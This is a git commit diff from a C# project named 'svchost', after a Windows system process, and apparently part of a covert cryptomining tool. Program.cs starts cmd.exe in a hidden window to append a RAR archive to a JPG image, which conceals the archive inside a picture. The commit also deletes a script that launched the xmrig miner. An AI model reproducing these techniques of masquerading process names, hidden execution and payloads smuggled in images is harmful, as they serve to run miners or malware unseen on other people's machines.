b88ce2697e463ae4d742f2d01d2c3051ac507b25
ALFA <alfa512ks@mail.ru>
2018-02-15 12:47:07 +0300

    Refactoring. xmrig.exe removed

--- svchost/Program.cs
+++ svchost/Program.cs
@@ -11,8 +11,8 @@ namespace svchost
 	{
 		static void Main(string[] args)
 		{
-			System.Diagnostics.Process process = new System.Diagnostics.Process();
-			System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+			Process process = new System.Diagnostics.Process();
+			ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
 			startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
 			startInfo.FileName = "cmd.exe";
 			startInfo.Arguments = "/C copy /b Image1.jpg + Archive.rar Image2.jpg";
--- svchost/svchost/xmrig/start.cmd
+++
@@ -1,3 +0,0 @@
-@echo off
-C:\Mining\xmrig\xmrig.exe
-pause
